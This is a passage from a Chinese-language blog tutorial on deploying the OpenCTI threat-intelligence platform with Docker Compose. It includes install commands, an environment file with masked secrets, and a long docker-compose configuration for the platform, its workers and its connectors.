class="comment"># 设置docker-compose的执行权限</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证docker-compose是否安装成功</span></span><br><span class="line">docker-compose --version</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Docker and Docker Compose have been installed successfully.&quot;</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(6, 6, 7);">在运行这个脚本之前，请确保你有足够的权限（可能需要</font><code>sudo</code><font style="color:rgb(6, 6, 7);">权限），并且你的系统支持这些命令。此外，这个脚本没有包含卸载旧版本Docker和Docker Compose的步骤，如果需要，你可能需要手动卸载它们。</font></p><p><font style="color:rgb(6, 6, 7);">要使用这个脚本：</font></p><ol><li><font style="color:rgb(6, 6, 7);">将上述代码保存到一个文件中，例如</font><code>install_docker_compose.sh</code><font style="color:rgb(6, 6, 7);">。</font></li><li><font style="color:rgb(6, 6, 7);">给这个文件执行权限：</font><code>chmod +x install_docker_compose.sh</code><font style="color:rgb(6, 6, 7);">。</font></li><li><font style="color:rgb(6, 6, 7);">运行这个脚本：</font><code>sudo ./install_docker_compose.sh</code><font style="color:rgb(6, 6, 7);">。</font></li></ol><p><font style="color:rgb(6, 6, 7);">请记得在运行任何脚本之前，都要仔细阅读和理解脚本中的命令，以确保它们对你的系统是安全的。</font></p><h2 id="rwJGW">下载安装文件</h2>把git项目下载到本地来<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /home/opencti</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/OpenCTI-Platform/docker.git</span><br><span class="line"><span class="built_in">cd</span> docker</span><br></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.75);">由于ES对内存要求较高，因此需要调整机器内存参数</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="string">&quot;vm.max_map_count=1048575&quot;</span>&gt;&gt; /etc/sysctl.conf</span><br></pre></td></tr></table></figure><h2 id="VQnGq">修改配置和环境变量</h2>![img.png](开源威胁情报项目OpenCTI安装及排坑/img.png)官网是这样写的<p>但我的配置如下：</p><p>先生成自己的uuid哈</p><p><img src="/google/3196a87b/img_2.png" alt="img.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">OPENCTI_ADMIN_EMAIL=admin@opencti.io //这里一定要是邮箱，不然会报错</span><br><span class="line">OPENCTI_ADMIN_PASSWORD=写你的密码啦</span><br><span class="line">OPENCTI_ADMIN_TOKEN=************ //写你的密钥，用</span><br><span class="line">OPENCTI_BASE_URL=http://0.0.0.0:8080</span><br><span class="line">MINIO_ROOT_USER=******5-a3c5-2ebb2f7a4f56</span><br><span class="line">MINIO_ROOT_PASSWORD=*********-b72e-0a6ebc8b3daa</span><br><span class="line">RABBITMQ_DEFAULT_USER=guest</span><br><span class="line">RABBITMQ_DEFAULT_PASS=guest</span><br><span class="line">ELASTIC_MEMORY_SIZE=4G</span><br><span class="line">CONNECTOR_HISTORY_ID=******-926e-e01ce1a43fb1</span><br><span class="line">CONNECTOR_EXPORT_FILE_STIX_ID=*********6f7-b9f6-d8d113446fe7</span><br><span class="line">CONNECTOR_EXPORT_FILE_CSV_ID=***********-a61b-991a4d2929ef</span><br><span class="line">CONNECTOR_IMPORT_FILE_STIX_ID=***********9eba-98252de156bc</span><br><span class="line">CONNECTOR_EXPORT_FILE_TXT_ID=***********-b171-c9ec67049655</span><br><span class="line">CONNECTOR_IMPORT_DOCUMENT_ID=***********cf-b05e-4a72fcc80289</span><br><span class="line">CONNECTOR_ANALYSIS_ID=***********78-b754-fabfd21d5985</span><br><span class="line">CONNECTOR_ALIENVAULT_ID=***********-4c2a-ad7d-f1edecc70ca3</span><br><span class="line">CONNECTOR_RANSOMWARE_ID=***********4-a0ff-4fe2b1f2576a</span><br><span class="line">CONNECTOR_CISAKEV_ID=***********5-8ffc-205d43209ac6</span><br><span class="line">OPENCTI_HEALTHCHECK_ACCESS_KEY=***********a-4e03-b79a-39771628259d</span><br><span class="line">SMTP_HOSTNAME=localhost</span><br></pre></td></tr></table></figure><p>这里特别注意一下，</p><p>OPENCTI_HEALTHCHECK_ACCESS_KEY一定一定不能为空</p><p>不然该容器的health检测会失败，导致连接器连接不上</p><h2 id="oajYC">启动项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>如果遇到错误了，删除容器，重新构建就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><h1 id="IUuK5">添加数据和连接器</h1>从项目介绍里面我们看到，平台只是一个展示的作用<p>目前是没有数据的</p><p><img src="/google/3196a87b/img_3.png" alt="img.png"><br>所以需要引入外部数据</p><p><a href="https://filigran.notion.site/OpenCTI-Ecosystem-868329e9fb734fca89692b2ed6087e76">https://filigran.notion.site/OpenCTI-Ecosystem-868329e9fb734fca89692b2ed6087e76</a></p><p><a href="https://github.com/OpenCTI-Platform/connectors/tree/master/external-import">https://github.com/OpenCTI-Platform/connectors/tree/master/external-import</a></p><p><img src="/google/3196a87b/img_4.png" alt="img.png"><br>可以直接在官网社区查看相关的连接器</p><p><img src="/google/3196a87b/img_5.png" alt="img.png"><br>其实就是爬虫探针</p><p>这里我举几个例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br></pre></td><td class="code"><pre><span class="line">services:</span><br><span class="line">  redis:</span><br><span class="line">    image: redis:7.4.0</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">      - redisdata:/data</span><br><span class="line">    healthcheck:</span><br><span class="line">      <span class="built_in">test</span>: [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;redis-cli&quot;</span>, <span class="string">&quot;ping&quot;</span>]</span><br><span class="line">      interval: 10s</span><br><span class="line">      <span class="built_in">timeout</span>: 5s</span><br><span class="line">      retries: 3</span><br><span class="line">  elasticsearch:</span><br><span class="line">    image: docker.elastic.co/elasticsearch/elasticsearch:8.15.2</span><br><span class="line">    volumes:</span><br><span class="line">      - esdata:/usr/share/elasticsearch/data</span><br><span class="line">    environment:</span><br><span class="line">      <span class="comment"># Comment-out the line below for a cluster of multiple nodes</span></span><br><span class="line">      - discovery.type=single-node</span><br><span class="line">      <span class="comment"># Uncomment the line below below for a cluster of multiple nodes</span></span><br><span class="line">      <span class="comment"># - cluster.name=docker-cluster</span></span><br><span class="line">      - xpack.ml.enabled=<span class="literal">false</span></span><br><span class="line">      - xpack.security.enabled=<span class="literal">false</span></span><br><span class="line">      - thread_pool.search.queue_size=5000</span><br><span class="line">      - logger.org.elasticsearch.discovery=<span class="string">&quot;ERROR&quot;</span></span><br><span class="line">      - <span class="string">&quot;ES_JAVA_OPTS=-Xms<span class="variable">$&#123;ELASTIC_MEMORY_SIZE&#125;</span> -Xmx<span class="variable">$&#123;ELASTIC_MEMORY_SIZE&#125;</span>&quot;</span></span><br><span class="line">    restart: always</span><br><span class="line">    ulimits:</span><br><span class="line">      memlock:</span><br><span class="line">        soft: -1</span><br><span class="line">        hard: -1</span><br><span class="line">      nofile:</span><br><span class="line">        soft: 65536</span><br><span class="line">        hard: 65536</span><br><span class="line">    healthcheck:</span><br><span class="line">      <span class="built_in">test</span>: curl -s http://elasticsearch:9200 &gt;/dev/null || <span class="built_in">exit</span> 1</span><br><span class="line">      interval: 30s</span><br><span class="line">      <span class="built_in">timeout</span>: 10s</span><br><span class="line">      retries: 50</span><br><span class="line">  minio:</span><br><span class="line">    image: minio/minio:RELEASE.2024-05-28T17-19-04Z <span class="comment"># Use &quot;minio/minio:RELEASE.2024-05-28T17-19-04Z-cpuv1&quot; to troubleshoot compatibility issues with CPU</span></span><br><span class="line">    volumes:</span><br><span class="line">      - s3data:/data</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;9000:9000&quot;</span></span><br><span class="line">    environment:</span><br><span class="line">      MINIO_ROOT_USER: <span class="variable">$&#123;MINIO_ROOT_USER&#125;</span></span><br><span class="line">      MINIO_ROOT_PASSWORD: <span class="variable">$&#123;MINIO_ROOT_PASSWORD&#125;</span>    </span><br><span class="line">    <span class="built_in">command</span>: server /data</span><br><span class="line">    restart: always</span><br><span class="line">    healthcheck:</span><br><span class="line">      <span class="built_in">test</span>: [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;mc&quot;</span>, <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;local&quot;</span>]</span><br><span class="line">      interval: 10s</span><br><span class="line">      <span class="built_in">timeout</span>: 5s</span><br><span class="line">      retries: 3</span><br><span class="line">  rabbitmq:</span><br><span class="line">    image: rabbitmq:3.13-management</span><br><span class="line">    environment:</span><br><span class="line">      - RABBITMQ_DEFAULT_USER=<span class="variable">$&#123;RABBITMQ_DEFAULT_USER&#125;</span></span><br><span class="line">      - RABBITMQ_DEFAULT_PASS=<span class="variable">$&#123;RABBITMQ_DEFAULT_PASS&#125;</span></span><br><span class="line">      - RABBITMQ_NODENAME=rabbit01@localhost</span><br><span class="line">    volumes:</span><br><span class="line">      - amqpdata:/var/lib/rabbitmq</span><br><span class="line">    restart: always</span><br><span class="line">    healthcheck:</span><br><span class="line">      <span class="built_in">test</span>: rabbitmq-diagnostics -q ping</span><br><span class="line">      interval: 30s</span><br><span class="line">      <span class="built_in">timeout</span>: 30s</span><br><span class="line">      retries: 3</span><br><span class="line">  opencti:</span><br><span class="line">    image: opencti/platform:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - NODE_OPTIONS=--max-old-space-size=8096</span><br><span class="line">      - APP__PORT=8080</span><br><span class="line">      - APP__BASE_URL=<span class="variable">$&#123;OPENCTI_BASE_URL&#125;</span></span><br><span class="line">      - APP__ADMIN__EMAIL=<span class="variable">$&#123;OPENCTI_ADMIN_EMAIL&#125;</span></span><br><span class="line">      - APP__ADMIN__PASSWORD=<span class="variable">$&#123;OPENCTI_ADMIN_PASSWORD&#125;</span></span><br><span class="line">      - APP__ADMIN__TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - APP__APP_LOGS__LOGS_LEVEL=error</span><br><span class="line">      - REDIS__HOSTNAME=redis</span><br><span class="line">      - REDIS__PORT=6379</span><br><span class="line">      - ELASTICSEARCH__URL=http://elasticsearch:9200</span><br><span class="line">      - MINIO__ENDPOINT=minio</span><br><span class="line">      - MINIO__PORT=9000</span><br><span class="line">      - MINIO__USE_SSL=<span class="literal">false</span></span><br><span class="line">      - MINIO__ACCESS_KEY=<span class="variable">$&#123;MINIO_ROOT_USER&#125;</span></span><br><span class="line">      - MINIO__SECRET_KEY=<span class="variable">$&#123;MINIO_ROOT_PASSWORD&#125;</span></span><br><span class="line">      - RABBITMQ__HOSTNAME=rabbitmq</span><br><span class="line">      - RABBITMQ__PORT=5672</span><br><span class="line">      - RABBITMQ__PORT_MANAGEMENT=15672</span><br><span class="line">      - RABBITMQ__MANAGEMENT_SSL=<span class="literal">false</span></span><br><span class="line">      - RABBITMQ__USERNAME=<span class="variable">$&#123;RABBITMQ_DEFAULT_USER&#125;</span></span><br><span class="line">      - RABBITMQ__PASSWORD=<span class="variable">$&#123;RABBITMQ_DEFAULT_PASS&#125;</span></span><br><span class="line">      - SMTP__HOSTNAME=<span class="variable">$&#123;SMTP_HOSTNAME&#125;</span></span><br><span class="line">      - SMTP__PORT=25</span><br><span class="line">      - PROVIDERS__LOCAL__STRATEGY=LocalStrategy</span><br><span class="line">      - APP__HEALTH_ACCESS_KEY=<span class="variable">$&#123;OPENCTI_HEALTHCHECK_ACCESS_KEY&#125;</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    depends_on:</span><br><span class="line">      redis:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">      elasticsearch:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">      minio:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">      rabbitmq:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">    restart: always</span><br><span class="line">    healthcheck:</span><br><span class="line">      <span class="built_in">test</span>:  [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;wget&quot;</span>, <span class="string">&quot;-qO-&quot;</span>, <span class="string">&quot;http://xx.xx.xx.xx:8080/health?health_access_key=<span class="variable">$&#123;OPENCTI_HEALTHCHECK_ACCESS_KEY&#125;</span>&quot;</span>]</span><br><span class="line">      interval: 10s</span><br><span class="line">      <span class="built_in">timeout</span>: 5s</span><br><span class="line">      retries: 20</span><br><span class="line">  worker:</span><br><span class="line">    image: opencti/worker:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - WORKER_LOG_LEVEL=info</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">    deploy:</span><br><span class="line">      mode: replicated</span><br><span class="line">      replicas: 6</span><br><span class="line">    restart: always</span><br><span class="line">  connector-export-file-stix:</span><br><span class="line">    image: opencti/connector-export-file-stix:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_EXPORT_FILE_STIX_ID&#125;</span> <span class="comment"># Valid UUIDv4</span></span><br><span class="line">      - CONNECTOR_TYPE=INTERNAL_EXPORT_FILE</span><br><span class="line">      - CONNECTOR_NAME=ExportFileStix2</span><br><span class="line">      - CONNECTOR_SCOPE=application/json</span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-export-file-csv:</span><br><span class="line">    image: opencti/connector-export-file-csv:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_EXPORT_FILE_CSV_ID&#125;</span> <span class="comment"># Valid UUIDv4</span></span><br><span class="line">      - CONNECTOR_TYPE=INTERNAL_EXPORT_FILE</span><br><span class="line">      - CONNECTOR_NAME=ExportFileCsv</span><br><span class="line">      - CONNECTOR_SCOPE=text/csv</span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-export-file-txt:</span><br><span class="line">    image: opencti/connector-export-file-txt:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_EXPORT_FILE_TXT_ID&#125;</span> <span class="comment"># Valid UUIDv4</span></span><br><span class="line">      - CONNECTOR_TYPE=INTERNAL_EXPORT_FILE</span><br><span class="line">      - CONNECTOR_NAME=ExportFileTxt</span><br><span class="line">      - CONNECTOR_SCOPE=text/plain</span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-import-file-stix:</span><br><span class="line">    image: opencti/connector-import-file-stix:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_IMPORT_FILE_STIX_ID&#125;</span> <span class="comment"># Valid UUIDv4</span></span><br><span class="line">      - CONNECTOR_TYPE=INTERNAL_IMPORT_FILE</span><br><span class="line">      - CONNECTOR_NAME=ImportFileStix</span><br><span class="line">      - CONNECTOR_VALIDATE_BEFORE_IMPORT=<span class="literal">true</span> <span class="comment"># Validate any bundle before import</span></span><br><span class="line">      - CONNECTOR_SCOPE=application/json,text/xml</span><br><span class="line">      - CONNECTOR_AUTO=<span class="literal">true</span> <span class="comment"># Enable/disable auto-import of file</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-import-document:</span><br><span class="line">    image: opencti/connector-import-document:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_IMPORT_DOCUMENT_ID&#125;</span> <span class="comment"># Valid UUIDv4</span></span><br><span class="line">      - CONNECTOR_TYPE=INTERNAL_IMPORT_FILE</span><br><span class="line">      - CONNECTOR_NAME=ImportDocument</span><br><span class="line">      - CONNECTOR_VALIDATE_BEFORE_IMPORT=<span class="literal">true</span> <span class="comment"># Validate any bundle before import</span></span><br><span class="line">      - CONNECTOR_SCOPE=application/pdf,text/plain,text/html</span><br><span class="line">      - CONNECTOR_AUTO=<span class="literal">true</span> <span class="comment"># Enable/disable auto-import of file</span></span><br><span class="line">      - CONNECTOR_ONLY_CONTEXTUAL=<span class="literal">false</span> <span class="comment"># Only extract data related to an entity (a report, a threat actor, etc.)</span></span><br><span class="line">      - CONNECTOR_CONFIDENCE_LEVEL=15 <span class="comment"># From 0 (Unknown) to 100 (Fully trusted)</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">      - IMPORT_DOCUMENT_CREATE_INDICATOR=<span class="literal">true</span></span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-analysis:</span><br><span class="line">    image: opencti/connector-import-document:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_ANALYSIS_ID&#125;</span> <span class="comment"># Valid UUIDv4</span></span><br><span class="line">      - CONNECTOR_TYPE=INTERNAL_ANALYSIS</span><br><span class="line">      - CONNECTOR_NAME=ImportDocumentAnalysis</span><br><span class="line">      - CONNECTOR_VALIDATE_BEFORE_IMPORT=<span class="literal">false</span> <span class="comment"># Validate any bundle before import</span></span><br><span class="line">      - CONNECTOR_SCOPE=application/pdf,text/plain,text/html</span><br><span class="line">      - CONNECTOR_AUTO=<span class="literal">true</span> <span class="comment"># Enable/disable auto-import of file</span></span><br><span class="line">      - CONNECTOR_ONLY_CONTEXTUAL=<span class="literal">false</span> <span class="comment"># Only extract data related to an entity (a report, a threat actor, etc.)</span></span><br><span class="line">      - CONNECTOR_CONFIDENCE_LEVEL=15 <span class="comment"># From 0 (Unknown) to 100 (Fully trusted)</span></span><br><span 